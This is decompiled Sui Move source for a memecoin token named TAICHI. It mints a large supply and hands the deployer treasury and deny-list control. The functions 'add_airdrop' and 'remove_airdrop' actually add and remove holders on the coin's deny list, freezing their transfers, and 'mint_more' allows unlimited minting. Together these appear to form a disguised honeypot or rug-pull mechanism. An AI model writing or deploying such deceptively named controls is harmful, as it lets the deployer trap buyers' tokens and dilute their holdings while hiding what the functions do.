module 0xc973f8dfe7a3985ba1f2fc53ba9214de3aba32358a3b1c560515babb2d11901b::TAICHI {
    struct TAICHI has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TAICHI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TAICHI>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: TAICHI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TAICHI>(arg0, 6, b"TAICHI", b"Sui Taichi Fu", b"https://www.instagram.com/dinghuart?igsh=MzRlODBiNWFlZA==", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmXxpct3rpHU9i8s4maEMzWvfQnCwV5u9oCNbAY7k954Dk?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TAICHI>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<TAICHI>>(0x2::coin::mint<TAICHI>(&mut v3, 1000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<TAICHI>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TAICHI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<TAICHI>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<TAICHI>>(0x2::coin::mint<TAICHI>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TAICHI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<TAICHI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

